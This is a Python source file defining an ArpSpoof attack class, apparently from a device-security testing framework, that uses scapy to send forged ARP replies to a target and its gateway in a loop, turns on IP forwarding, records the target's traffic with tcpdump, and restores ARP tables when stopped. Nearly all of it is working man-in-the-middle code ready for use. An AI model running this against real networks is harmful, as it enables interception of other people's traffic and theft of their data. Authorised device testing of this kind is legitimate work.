import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import*
from generic_attack import *
import logging
log = logging.getLogger(__name__)
from util import ioutil
import time
import platform

class ArpSpoof(GenericAttack):
    """ARP spoofing class
    """
    def __init__(self, attackName, attackConfig, deviceConfig):
        super(ArpSpoof, self).__init__(attackName, attackConfig, deviceConfig)


    def initialize(self, result):
        self.running = True
        gateway = self.device["target-ip"]

        self.respoofer(self.device["ip"], gateway)
        return

    def respoofer(self, targetIp, gatewayIp):
        """ Respoof the target every two seconds.
        """
        file_prefix = "arp";
        if ("file_prefix" in self.config.keys()):
            file_prefix = self.config["file_prefix"]

        filename = 'results/' + self.device['time'] + '/' + file_prefix + self.device['macAddress'] + '.pcap'

        self.enable_packet_forwarding()
        if self.config['tcpdump']:
            global proc
            proc = subprocess.Popen(['tcpdump', 'host', targetIp, '-w',
                                  filename], stdout=subprocess.PIPE)
        try:
            targetMac = ioutil.NetworkUtil.getMacbyIp(targetIp)
            gatewayMAC = ioutil.NetworkUtil.getMacbyIp(gatewayIp)
            sleepTime = self.config['delay_in_seconds']
            warmupTime = self.config['warmup_in_seconds']
            iter = 0
            while self.running:
                self.arpspoof(targetIp, gatewayIp, gatewayMAC, targetMac)
                if iter < 5:
                    iter += 1
                    time.sleep(warmupTime)
                else:
                    time.sleep(sleepTime)
            self.restoreARP(targetIp, gatewayIp)
            self.disable_packet_forwarding()
            self.terminateDump()
        except Exception, j:
            self.terminateDump()
            self.disable_packet_forwarding()
            self.restoreARP(targetIp, gatewayIp)



    # enables packet forwarding by interacting with the proc filesystem
    def enable_packet_forwarding(self):
        if platform.system() == "Darwin":
            os.system('sysctl -w net.inet.ip.forwarding=1 > /dev/null')
            os.system('sudo sysctl -w net.inet.ip.fw.enable=1 > /dev/null ')
        else:
            log.info("enabled ip forwarding")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # disables packet forwarding by interacting with the proc filesystem
    def disable_packet_forwarding(self):
        if platform.system() == "Darwin":
            os.system('sysctl -w net.inet.ip.forwarding=0 > /dev/null')
            os.system('sudo sysctl -w net.inet.ip.fw.enable=0 > /dev/null ')
        else:
            pass
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def arpspoof(self, gatewayIP, victimIP, gatewayMac, victimMac):
        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMac))
        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gatewayMac))

    def restoreARP(self, gatewayIP, victimIP):
        victimMAC = ioutil.NetworkUtil.getMacbyIp(victimIP)
        gatewayMAC = ioutil.NetworkUtil.getMacbyIp(gatewayIP)
        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=4)

    def terminateDump(self):
        if self.config['tcpdump']:
            global proc
            proc.terminate()
            #subprocess.Popen(['sudo', 'kill', '9', proc.pid])

    def shutdown(self):
        self.running = False
        return True

